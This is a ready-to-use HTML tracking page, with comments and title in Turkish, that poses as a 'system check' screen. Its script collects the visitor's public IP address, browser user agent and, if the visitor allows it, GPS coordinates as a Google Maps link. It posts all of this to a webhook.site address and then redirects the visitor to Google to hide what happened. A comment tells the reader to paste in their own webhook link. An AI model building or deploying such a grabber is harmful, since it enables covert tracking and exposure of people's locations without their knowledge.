<!DOCTYPE html>
<html>
<head>
    <title>Sistem Kontrol Ediliyor...</title>
</head>
<body>
    <script>
        // BURAYA KENDİ WEBHOOK LİNKİNİ YAPIŞTIR
        const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";

        function verileriGonder(ip, konumVerisi = "İzin Verilmedi") {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    ip_adresi: ip,
                    cihaz: navigator.userAgent,
                    harita_konumu: konumVerisi,
                    zaman: new Date().toLocaleString()
                })
            }).then(() => {
                // Bilgi gidince Google'a yolla
                window.location.href = "https://www.google.com";
            });
        }

        // Önce IP'yi al
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(ipData => {
                const userIP = ipData.ip;

                // Konum izni iste
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            // İzin verildi, koordinatları al
                            const link = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                            verileriGonder(userIP, link);
                        },
                        () => {
                            // İzin reddedildi
                            verileriGonder(userIP, "Kullanıcı Konum İznini Reddetti");
                        },
                        { timeout: 5000 }
                    );
                } else {
                    verileriGonder(userIP, "Tarayıcı GPS Desteklemiyor");
                }
            });
    </script>
</body>
</html>
